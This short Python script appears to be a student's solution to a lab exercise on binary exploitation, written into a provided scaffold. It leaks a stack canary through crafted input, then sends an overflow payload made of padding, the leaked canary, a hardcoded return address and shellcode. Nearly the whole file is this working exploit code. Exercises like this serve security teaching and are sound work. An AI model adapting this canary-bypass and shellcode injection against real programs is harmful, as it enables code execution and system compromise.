#!/usr/bin/env python3

import scaffold as p
from scaffold import SHELLCODE
import sys

# Configure Python to print text strings like byte strings. Don't remove this!
sys.stdout.reconfigure(encoding='latin1')

### YOUR CODE STARTS HERE ###

# Program start:
p.start()

p.send('A' * 12 + '\\' + 'x' + '\n')
recor = p.recv(17)
canary = recor[13:17]

print(recor)
print(canary)
#print(canary)
p.send('\x00' + 'A' * 15 + canary + 'A' * 12 + '\x40\xdb\xff\xff' + SHELLCODE + '\n')



# Example receive:
#assert p.recv(6) == 'testA\n'

### YOUR CODE ENDS HERE ###
